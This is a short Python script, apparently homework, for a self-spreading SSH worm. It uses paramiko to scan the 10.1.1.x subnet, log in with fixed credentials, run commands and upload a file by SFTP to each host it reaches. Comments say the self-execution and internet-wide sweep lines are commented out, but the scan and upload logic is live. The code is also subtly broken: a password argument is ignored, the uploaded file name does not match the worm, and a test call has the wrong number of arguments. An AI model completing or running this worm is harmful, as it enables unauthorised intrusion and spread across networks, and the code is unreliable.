from sys import argv
import os
import subprocess
import paramiko

# this worm is only use as homework
# I comment out some line so it will not make attack
# it can only go into the computer you know password

# a specific case for our stargate
name = "yourschoolid"
host="stargate.cs.usfca.edu"
password = "yourpassowrd"

# a specific case for your raspberry pi
name_pi = "yourpiid"
host_pi="0.0.0.0" # the ip of raspberry pi
password_pi = "yourpipassowrd"

#ssh and scpy the worm
def ssh2remote(ip,username,passwd):
   try:
       ssh = paramiko.SSHClient()
       ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
       ssh.connect(ip,22,username,password,timeout=5)
       stdin,stdout,stderr = ssh.exec_command("ls")
        #interact with server, typing Y
       print(stdout.read())
       stdin,stdout,stderr = ssh.exec_command("mkdir worm")
       print(stdout.read())
       ftp_client=ssh.open_sftp()
       ftp_client.put("ssh+copy.py","ssh+copy.py")
       ftp_client.close()
       print('%s OK\n'%(ip))

       #enable this make endless worm copy so don't enable it
       #stdin,stdout,stderr = ssh.exec_command("cd worm")
       #stdin,stdout,stderr = ssh.exec_command("python worm")

       ssh.close()
       return True
   except :
       print("error")
       return False

# try to connect to nearby ip
def connect_to_nearby(ip):
    for i in range (0,256):
        tmp = ip + str(i)
        print (tmp)
        if ssh2remote(tmp, name, password):
            break

# try to connect to all possible ip
def connect_to_all():
    ip = ""
    for i in range (0,256):
        for j in range (0,256):
            for p in range (0,256):
                for k in range (0,256):
                    ip = str(i)+"."+str(j)+"."+str(p)+"."+str(k)
                    print(ip)


# an example try to connect to 10.1.1.
connect_to_nearby("10.1.1.")

# spend too long time
# connect_to_all()

# test the ssh scp part
# ssh2remote(host,name,password,"ls")
